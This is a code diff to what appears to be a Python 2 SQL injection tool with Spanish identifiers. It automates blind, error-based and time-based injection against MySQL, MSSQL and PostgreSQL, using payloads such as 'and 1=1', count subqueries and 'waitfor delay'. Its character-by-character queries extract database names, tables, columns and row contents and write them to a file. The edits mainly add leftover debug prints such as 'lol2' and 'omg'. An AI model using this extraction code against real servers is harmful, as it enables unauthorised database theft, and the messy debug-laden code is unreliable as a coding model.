@@ -458,8 +458,8 @@ class Injection:
 			consulta = requests.get(url=direccion+"="+str(ord(caracter))+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 			if obj.verbosity:
 				obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(direccion+"="+str(ord(caracter))+obj.suf)))
-			#if tipo == "da2tos":
-				#print "2"+direccion+"="+str(ord(caracter))+obj.suf
+			if tipo == "bases":
+				print direccion+"="+str(ord(caracter))+obj.suf
 			if consulta.text == ok:
 				return caracter
 			elif (consulta.text != ok) and (up == down ):
@@ -471,8 +471,8 @@ class Injection:
 				consulta2 = requests.get(url=direccion+">"+str(ord(caracter))+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 				if obj.verbosity:
 					obj.showData(objeto=consulta2,vulnerable=True,lll=unquote(repr(direccion+">"+str(ord(caracter))+obj.suf)))
-				#if tipo == "dat2os":
-					#print direccion+"="+str(ord(caracter))+obj.suf
+				if tipo == "bases":
+					print direccion+"="+str(ord(caracter))+obj.suf
 				#consulta2 = requests.get(url=direccion+">"+str(ord(caracter))+manejador[tipo][7]+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 
 					
@@ -622,6 +622,7 @@ class Injection:
 		bandera = 0
 		tabla = ""
 		if tipo == "mysql" or tipo == "mssql":
+			print bases.keys()
 			for where in bases.keys():
 				print "BASE: "+where
 				bandera = 0
@@ -632,6 +633,7 @@ class Injection:
 				elif tipo == "mssql":
 					condicion = where
 					indiceX = 1
+					print "omg"
 				#print "WHERE: "+ condicion+ "char: "+ char + "bandera: ",bandera
 				while char == "No encontrado" and bandera != 1:
 					char = ""
@@ -677,6 +679,7 @@ class Injection:
 	
 	@staticmethod
 	def getColumnas(obj,manejador,tipo,ok,up,down,fila,columna,where,based,bases,current,version):
+		print bases
 		indiceY	= 1
 		indiceX = 0
 		bandera = 0
@@ -749,7 +752,7 @@ class Injection:
 							banderaCol = 1
 						if where != '' and table != '' and columna != '':
 
-							obj.getInfo(obj,manejador,tipo,ok,126,32,0,0,"",obj.based,where,current,table,columna,f)
+							obj.getInfo(obj,manejador,tipo,ok,126,32,0,0,where,obj.based,where,current,table,columna,f,columna1)
 
 
 
@@ -766,9 +769,10 @@ class Injection:
 		
 		
 	@staticmethod
-	def getInfo(obj,manejador,tipo,ok,up,down,fila,columnas,where,based,bases,current,table,columna,f):
+	def getInfo(obj,manejador,tipo,ok,up,down,fila,columnas,where,based,bases,current,table,columna,f,columna1):
 		print "\n\nBase: "+where+" Tabla:"+table+" columnas: "+columna
 		f.write("Base: "+where+" Tabla:"+table+" columnas: "+columna+"\n");
+
 		char2 = "No encontrado"
 		bandera2 = 0
 		indiceY2	= 1
@@ -782,7 +786,7 @@ class Injection:
 		pagCont = requests.get(url=obj.server+obj.pref+" and 1=1"+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 		if obj.verbosity:
 			obj.showData(objeto=pagCont,vulnerable=True,lll=unquote(repr(obj.server+obj.pref+" and 1=1"+obj.suf)))
-		
+		#print "2lol"+tipo
 		#print count.text
 		#print pagCont.text
 		if tipo == "mysql" and obj.based == "error":
@@ -791,7 +795,7 @@ class Injection:
 				if obj.verbosity:
 					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(obj.server+obj.pref+" and (select count(*) from "+where+"."+table+")="+str(limite)+obj.suf)))
 
-				#print obj.server+"' and (select count(*) from "+where+"."+table+")="+str(limite)+"-- -+"
+				#print obj.server+obj.pref+" and (select count(*) from "+where+"."+table+")="+str(limite)+obj.suf
 				limite = limite +1
 
 		elif tipo == "pgsql" and obj.based == "error":
@@ -827,6 +831,7 @@ class Injection:
 				if obj.verbosity:
 					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(obj.server+obj.pref+"  if (select count(*) from "+where+".."+table+")="+str(limite)+" waitfor delay '00:00:01'"+obj.suf)))
 				limite = limite +1
+		#print "3lol"
 		#print "columna "+ columna
 		#print "limite:"
 		#print limite				
@@ -863,6 +868,7 @@ class Injection:
 			bandera2 = indiceY2
 			indiceY2 = 1
 			limite2 = limite2 +1
+		#f.close()
 	
 	@staticmethod
 	def getDatos(obj,manejador,ok,tipo):
@@ -875,8 +881,9 @@ class Injection:
 		print "Version: "+version
 ###=========Bases===============
 		print "Bases:"
-		bases = obj.getBases(obj,manejador,"bases",ok,126,32,indiceY,indiceX,"",obj.based)
-		
+		bases = obj.getBases(obj,manejador,tipo,ok,126,32,indiceY,indiceX,"",obj.based)
+		print bases
+		print "lol2"
 ###=========Current============= 
 		
 		current = ""
@@ -901,7 +908,7 @@ class Injection:
 		print "Version: "+version
 		#print bases[:len(bases)-1]
 		print bases
-		f.close()
+		
 		
 			
 	@staticmethod
